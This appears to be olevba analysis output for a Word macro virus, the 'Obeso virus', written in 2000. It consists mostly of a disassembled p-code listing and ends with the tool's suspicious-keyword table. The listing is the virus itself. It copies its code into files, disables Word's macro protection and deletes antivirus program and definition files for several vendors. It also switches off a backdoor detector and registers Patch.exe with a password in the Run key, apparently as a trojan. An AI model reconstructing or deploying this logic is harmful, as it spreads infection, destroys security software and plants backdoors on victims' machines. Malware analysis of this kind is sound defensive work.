' 	Ld Documents 
' 	ArgsMemCall Save 0x0001 
' 	EndIf 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	QuoteRem 0x0000 0x0025 "/*/*/*/*/ It's very effective, isn't?"
' Line #96:
' 	EndSub 
' Line #97:
' 	FuncDefn (Private Sub Document_New())
' Line #98:
' 	OnError (Resume Next) 
' Line #99:
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Ld Now 
' 	ArgsLd Second 0x0001 
' 	Eq 
' 	IfBlock 
' Line #100:
' 	LitStr 0x0007 "320,200"
' 	LitStr 0x0000 ""
' 	LitStr 0x0024 "HKEY_CURRENT_CONFIG\Display\Settings"
' 	LitStr 0x000A "Resolution"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #101:
' 	LitStr 0x0001 "9"
' 	LitStr 0x0000 ""
' 	LitStr 0x0024 "HKEY_CURRENT_CONFIG\Display\Settings"
' 	LitStr 0x000B "MouseTrails"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #102:
' 	EndIfBlock 
' Line #103:
' 	EndSub 
' Line #104:
' 	FuncDefn (Private Sub Document_Open())
' Line #105:
' 	OnError (Resume Next) 
' Line #106:
' 	Ld Now 
' 	ArgsLd Hour 0x0001 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Eq 
' 	IfBlock 
' Line #107:
' 	LitStr 0x0003 "c:\"
' 	St mc 
' Line #108:
' 	Ld mc 
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	St mn 
' Line #109:
' 	Ld mn 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #110:
' 	Ld mc 
' 	Ld mn 
' 	Concat 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbArchive 
' 	And 
' 	Paren 
' 	Ld vbArchive 
' 	Eq 
' 	IfBlock 
' Line #111:
' 	Ld mn 
' 	LitDI2 0x0004 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #112:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #113:
' 	Ld y 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St k 
' Line #114:
' 	LitDI2 0x0004 
' 	Sharp 
' 	PrintChan 
' 	Ld k 
' 	PrintItemNL 
' Line #115:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #116:
' 	LitDI2 0x0004 
' 	Sharp 
' 	Close 0x0001 
' Line #117:
' 	EndIfBlock 
' Line #118:
' 	Ld Dir 
' 	St mn 
' Line #119:
' 	Loop 
' Line #120:
' 	EndIfBlock 
' Line #121:
' 	EndSub 
' Line #122:
' 	FuncDefn (Private Sub Fatz())
' Line #123:
' 	QuoteRem 0x0000 0x001E ">Retirado do MEU virus GHOUL 3"
' Line #124:
' 	QuoteRem 0x0000 0x0035 "Carai isso eh um arrasoo neh... pode falar a verdade!"
' Line #125:
' 	OnError (Resume Next) 
' Line #126:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #127:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #128:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #129:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #130:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #131:
' 	LitVarSpecial (False)
' 	LitDI2 0x0006 
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #132:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #133:
' 	Ld wdKeyAlt 
' 	ParamNamed Arg1 
' 	Ld wdKeyF11 
' 	ParamNamed Arg2 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ParamNamed KeyCode 
' 	Ld wdKeyCategoryCommand 
' 	ParamNamed KeyCategory 
' 	LitStr 0x0007 "hahaNOT"
' 	ParamNamed Command 
' 	Ld KeyBindings 
' 	ArgsMemCall Add 0x0003 
' Line #134:
' 	Ld wdKeyAlt 
' 	ParamNamed Arg1 
' 	Ld wdKeyF8 
' 	ParamNamed Arg2 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ParamNamed KeyCode 
' 	Ld wdKeyCategoryCommand 
' 	ParamNamed KeyCategory 
' 	LitStr 0x0007 "hahaNOT"
' 	ParamNamed Command 
' 	Ld KeyBindings 
' 	ArgsMemCall Add 0x0003 
' Line #135:
' 	Dim 
' 	VarDefn McAfee
' 	VarDefn FMcAfee
' 	VarDefn FProt
' 	VarDefn FFProt
' 	VarDefn VET
' 	VarDefn FVET
' 	VarDefn Avast
' 	VarDefn FAvast
' 	VarDefn TheCleaner
' 	VarDefn FTheCleaner
' 	VarDefn Panda
' 	VarDefn FPanda
' 	VarDefn AVP
' 	VarDefn FAVP
' Line #136:
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\Command Software\F-PROT32"
' 	LitStr 0x0008 "Location"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St FProt 
' Line #137:
' 	LitStr 0x0000 ""
' 	LitStr 0x0042 "HKEY_LOCAL_MACHINE\Software\Cybec\VET Antivirus for Win32\Resident"
' 	LitStr 0x0007 "VetPath"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St VET 
' Line #138:
' 	LitStr 0x0000 ""
' 	LitStr 0x0029 "HKEY_LOCAL_MACHINE\Software\McAfee\Scan95"
' 	LitStr 0x0011 "szProductLocation"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St McAfee 
' Line #139:
' 	LitStr 0x0000 ""
' 	LitStr 0x0032 "HKEY_LOCAL_MACHINE\Software\ALWIL Software\Avast32"
' 	LitStr 0x0004 "Path"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St Avast 
' Line #140:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_USERS\.DEFAULT\Software\MooSoft Development\The Cleaner"
' 	LitStr 0x0009 "tcshellex"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St TheCleaner 
' Line #141:
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_LOCAL_MACHINE\Software\Panda Software\Panda Antivirus 6.0"
' 	LitStr 0x0004 "Path"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St Panda 
' Line #142:
' 	LitStr 0x0000 ""
' 	LitStr 0x002E "HKEY_LOCAL_MACHINE\KasperskyLab\Components\100"
' 	LitStr 0x0006 "Folder"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St AVP 
' Line #143:
' 	Ld FProt 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	St FFProt 
' 	BoS 0x0000 
' 	Ld VET 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	St FVET 
' 	BoS 0x0000 
' 	Ld McAfee 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	St FMcAfee 
' 	BoS 0x0000 
' 	Ld Avast 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	St FAvast 
' 	BoS 0x0000 
' 	Ld TheCleaner 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	St FTheCleaner 
' 	BoS 0x0000 
' 	Ld Panda 
' 	LitStr 0x0003 "*.*"
' 	Add 
' 	St FPanda 
' 	BoS 0x0000 
' 	Ld AVP 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	St FAVP 
' 	BoS 0x0000 
' 	Ld FProt 
' 	LitStr 0x0006 "\*.Dat"
' 	Add 
' 	St Affprot 
' 	BoS 0x0000 
' 	Ld FProt 
' 	LitStr 0x0006 "\*.Def"
' 	Add 
' 	St Bffprot 
' 	BoS 0x0000 
' 	Ld VET 
' 	LitStr 0x0006 "\*.Dat"
' 	Add 
' 	St Afvet 
' 	BoS 0x0000 
' 	Ld McAfee 
' 	LitStr 0x0006 "\*.Dat"
' 	Add 
' 	St AFMcAfee 
' 	BoS 0x0000 
' 	Ld Avast 
' 	LitStr 0x0006 "\*.Dat"
' 	Add 
' 	St afavast 
' 	BoS 0x0000 
' 	Ld Avast 
' 	LitStr 0x0006 "\*.Dll"
' 	Add 
' 	St bfavast 
' 	BoS 0x0000 
' 	Ld TheCleaner 
' 	LitStr 0x0006 "\*.Dll"
' 	Add 
' 	St afthecleaner 
' 	BoS 0x0000 
' 	Ld Panda 
' 	LitStr 0x0005 "*.Dat"
' 	Add 
' 	St afpanda 
' 	BoS 0x0000 
' 	Ld Panda 
' 	LitStr 0x0005 "*.Dll"
' 	Add 
' 	St bfpanda 
' 	BoS 0x0000 
' 	Ld AVP 
' 	LitStr 0x0006 "\*.Dat"
' 	Add 
' 	St afavp 
' 	BoS 0x0000 
' 	Ld AVP 
' 	LitStr 0x0006 "\*.Dll"
' 	Add 
' 	St bfavp 
' 	BoS 0x0000 
' Line #144:
' 	Ld FFProt 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Affprot 
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	Ld Bffprot 
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	Ld FFProt 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #145:
' 	Ld FVET 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Afvet 
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	Ld FVET 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #146:
' 	Ld FMcAfee 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld AFMcAfee 
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	Ld FMcAfee 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #147:
' 	Ld FAvast 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld afavast 
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	Ld bfavast 
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	Ld FAvast 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #148:
' 	Ld FTheCleaner 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld afthecleaner 
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	Ld FTheCleaner 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #149:
' 	Ld FPanda 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld afpanda 
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	Ld bfpanda 
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	Ld FPanda 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #150:
' 	Ld FAVP 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld afavp 
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	Ld bfavp 
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	Ld FAVP 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #151:
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0001 "0"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Fim 
' 	EndIf 
' Line #152:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0001 "0"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #153:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0001 "1"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #154:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0001 "2"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #155:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0001 "3"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #156:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0001 "4"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #157:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0001 "5"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #158:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0001 "6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #159:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0001 "7"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #160:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0001 "8"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #161:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0001 "9"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #162:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0002 "10"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #163:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0009 "AutoStart"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #164:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x000A "AutoVerify"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #165:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0006 "BOProt"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #166:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0009 "ExtraPort"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #167:
' 	LitStr 0x0008 "DISABLED"
' 	LitStr 0x0000 ""
' 	LitStr 0x0035 "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32"
' 	LitStr 0x0009 "NetBusAdv"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #168:
' 	Label Fim 
' Line #169:
' 	LitStr 0x0014 "C:\Windows\PATCH.EXE"
' 	ArgsLd FileLen 0x0001 
' 	LitDI4 0x3600 0x0007 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0022 "c:\windows\Patch.exe /pass:killfhc"
' 	LitStr 0x0000 ""
' 	LitStr 0x0040 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
' 	LitStr 0x0005 "PATCH"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #170:
' 	EndSub 
' Line #171:
' 	FuncDefn (Sub AutoExit())
' Line #172:
' 	OnError (Resume Next) 
' Line #173:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitStr 0x0002 "09"
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitStr 0x0002 "07"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #174:
' 	QuoteRem 0x0000 0x002C "It's my birthday!!! 7 de Setembro de 1984!!!"
' Line #175:
' 	ArgsCall Read 0x0000 
' Line #176:
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St k1 
' Line #177:
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St k2 
' Line #178:
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St k3 
' Line #179:
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St K4 
' Line #180:
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St K5 
' Line #181:
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St K6 
' Line #182:
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St K7 
' Line #183:
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St K8 
' Line #184:
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St K9 
' Line #185:
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St K10 
' Line #186:
' 	Ld k1 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k2 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k3 
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0028 "HKEY_USERS\.DEFAULT\Control Panel\Colors"
' 	LitStr 0x000C "ActiveBorder"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #187:
' 	Ld k3 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k2 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k1 
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0028 "HKEY_USERS\.DEFAULT\Control Panel\Colors"
' 	LitStr 0x000B "ActiveTitle"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #188:
' 	Ld k1 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k3 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k2 
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0028 "HKEY_USERS\.DEFAULT\Control Panel\Colors"
' 	LitStr 0x000C "AppWorkspace"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #189:
' 	Ld k1 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k1 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k3 
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0028 "HKEY_USERS\.DEFAULT\Control Panel\Colors"
' 	LitStr 0x000A "Background"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #190:
' 	Ld k3 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k3 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k2 
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0028 "HKEY_USERS\.DEFAULT\Control Panel\Colors"
' 	LitStr 0x000A "ButtonFace"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #191:
' 	Ld k2 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k1 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k2 
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0028 "HKEY_USERS\.DEFAULT\Control Panel\Colors"
' 	LitStr 0x000A "ButtonText"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #192:
' 	Ld k3 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k2 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k3 
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0028 "HKEY_USERS\.DEFAULT\Control Panel\Colors"
' 	LitStr 0x000D "InactiveTitle"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #193:
' 	Ld k1 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k2 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k1 
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0028 "HKEY_USERS\.DEFAULT\Control Panel\Colors"
' 	LitStr 0x0011 "InactiveTitleText"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #194:
' 	Ld k2 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k2 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k2 
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0028 "HKEY_USERS\.DEFAULT\Control Panel\Colors"
' 	LitStr 0x0004 "Menu"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #195:
' 	Ld k3 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k3 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k3 
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0028 "HKEY_USERS\.DEFAULT\Control Panel\Colors"
' 	LitStr 0x0008 "MenuText"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #196:
' 	Ld k1 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k1 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k1 
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0028 "HKEY_USERS\.DEFAULT\Control Panel\Colors"
' 	LitStr 0x0009 "Scrollbar"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #197:
' 	Ld k2 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k3 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k1 
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0028 "HKEY_USERS\.DEFAULT\Control Panel\Colors"
' 	LitStr 0x0006 "Window"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #198:
' 	Ld k3 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k1 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld k1 
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0028 "HKEY_USERS\.DEFAULT\Control Panel\Colors"
' 	LitStr 0x000A "WindowText"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #199:
' 	EndIfBlock 
' Line #200:
' 	QuoteRem 0x0000 0x0060 "Bom, esse vírus só vai fazer isso, por enquanto... é que eu não estava com muitas idéias hoje..."
' Line #201:
' 	EndSub 
' Line #202:
' Line #203:
' 	QuoteRem 0x0000 0x0000 ""
' Line #204:
' 	QuoteRem 0x0000 0x000B "Obeso virus"
' Line #205:
' 	QuoteRem 0x0000 0x0019 "               by The Bug"
' Line #206:
' Line #207:
' 	QuoteRem 0x0000 0x0023 " Your files seems more fat?!? Shit!"
' Line #208:
' 	QuoteRem 0x0000 0x0029 " ah, caution, this virus can to grow fat!"
' Line #209:
' Line #210:
' 	QuoteRem 0x0000 0x002C "obs: Não reparem nos meus erros de inglês..."
' Line #211:
' Line #212:
' 	QuoteRem 0x0000 0x001F "Finished: 25/Jul/00 at 03:48 am"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |PATCH.EXE           |Executable file name                         |
|IOC       |Patch.exe           |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

